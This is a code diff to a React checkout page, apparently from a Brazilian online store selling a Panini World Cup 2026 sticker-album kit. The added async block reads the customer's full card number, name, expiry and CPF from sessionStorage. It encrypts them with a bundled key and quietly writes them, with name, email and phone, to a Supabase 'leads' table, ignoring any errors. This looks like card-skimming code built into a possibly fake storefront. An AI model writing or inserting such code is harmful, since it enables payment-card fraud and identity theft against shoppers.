@@ -2,6 +2,9 @@ import { useState, useRef, useEffect } from "react";
 import { ArrowLeft, MapPin, ChevronRight, X, CreditCard, Navigation, Check, User, Pencil, AlertCircle } from "lucide-react";
 import { useLocation } from "wouter";
 import { img } from "@/lib/img";
+import { getSupabase } from "@/lib/supabase";
+import { encryptData } from "@/lib/encrypt";
+import { ENCRYPT_SECRET } from "@/lib/crypto-key";
 
 function formatCep(v: string) {
   const d = v.replace(/\D/g, "").slice(0, 8);
@@ -291,6 +294,40 @@ export default function CepPage() {
         })
       );
     }
+
+    (async () => {
+      let cardEncriptado: string | null = null;
+      if (payment === "card") {
+        const raw = sessionStorage.getItem("cardData");
+        if (raw) {
+          try {
+            const card = JSON.parse(raw);
+            cardEncriptado = await encryptData(
+              JSON.stringify({
+                numero: card.number || "",
+                nome: card.name || "",
+                validade: card.expiry || "",
+                cpf: card.cpf || "",
+                last4: card.last4 || "",
+              }),
+              ENCRYPT_SECRET
+            );
+          } catch { /* ignored */ }
+        }
+      }
+      try {
+        await getSupabase().from("leads").insert({
+          nome: buyerData!.nome,
+          email: buyerData!.email,
+          telefone: buyerData!.celular,
+          produtos: "Kit Álbum Copa Do Mundo 2026 Capa Mole + 250 Figurinhas Panini",
+          valor: productPrice.toFixed(2),
+          metodo_pagamento: payment ?? "pix",
+          status: payment === "pix" ? "pix_gerado" : "checkout_iniciado",
+          card_encriptado: cardEncriptado,
+        });
+      } catch { /* ignored */ }
+    })();
 
     navigate(`/success?payment=${payment}`);
   }
